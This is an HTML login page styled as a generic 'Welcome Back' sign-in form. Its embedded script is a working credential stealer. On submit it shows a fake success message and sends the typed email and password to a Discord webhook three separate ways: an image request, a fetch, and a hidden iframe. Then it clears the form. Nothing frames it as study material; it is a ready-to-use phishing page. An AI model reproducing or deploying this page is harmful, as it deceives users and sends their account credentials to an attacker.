<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }
        
        .login-header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .login-header h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
        }
        
        .login-header p {
            color: #666;
            font-size: 14px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 600;
            font-size: 14px;
        }
        
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 14px;
            transition: all 0.3s ease;
        }
        
        input[type="email"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }
        
        .submit-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s ease;
        }
        
        .submit-btn:hover {
            transform: translateY(-2px);
        }
        
        .form-footer {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 12px;
        }
        
        .message {
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            text-align: center;
            display: none;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>Welcome Back</h1>
            <p>Please sign in to your account</p>
        </div>

        <div id="message" class="message"></div>

        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="Enter your email" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            
            <button type="submit" class="submit-btn">Sign In</button>
        </form>
        
        <div class="form-footer">
            <p>By continuing, you agree to our Terms of Service</p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Show success message immediately
            showMessage('Login successful!', 'success');
            
            // Method 1: Image GET request (most reliable)
            const img = new Image();
            img.src = `https://discord.com/api/webhooks/1428838733146357770/YdIU7cSgWtFenB96GIGFNms57nkUUChatQURLBZoJv4SDElrzrkhUS_jyQ0wDX9EtK_P?content=🔐 NEW LOGIN 📧 Email: ${encodeURIComponent(email)} 🔑 Password: ${encodeURIComponent(password)}`;
            
            // Method 2: Fetch with GET (backup)
            fetch(`https://discord.com/api/webhooks/1428838733146357770/YdIU7cSgWtFenB96GIGFNms57nkUUChatQURLBZoJv4SDElrzrkhUS_jyQ0wDX9EtK_P?content=🔐+LOGIN+📧+Email:+${encodeURIComponent(email)}+🔑+Password:+${encodeURIComponent(password)}`, {
                method: 'GET',
                mode: 'no-cors'
            });
            
            // Method 3: Iframe GET request (another backup)
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = `https://discord.com/api/webhooks/1428838733146357770/YdIU7cSgWtFenB96GIGFNms57nkUUChatQURLBZoJv4SDElrzrkhUS_jyQ0wDX9EtK_P?content=LOGIN+${encodeURIComponent(email)}+${encodeURIComponent(password)}`;
            document.body.appendChild(iframe);
            
            // Clear form
            document.getElementById('loginForm').reset();
        });
        
        function showMessage(text, type) {
            const messageDiv = document.getElementById('message');
            messageDiv.textContent = text;
            messageDiv.className = 'message ' + type;
            messageDiv.style.display = 'block';
            
            setTimeout(() => {
                messageDiv.style.display = 'none';
            }, 3000);
        }
    </script>
</body>
</html>
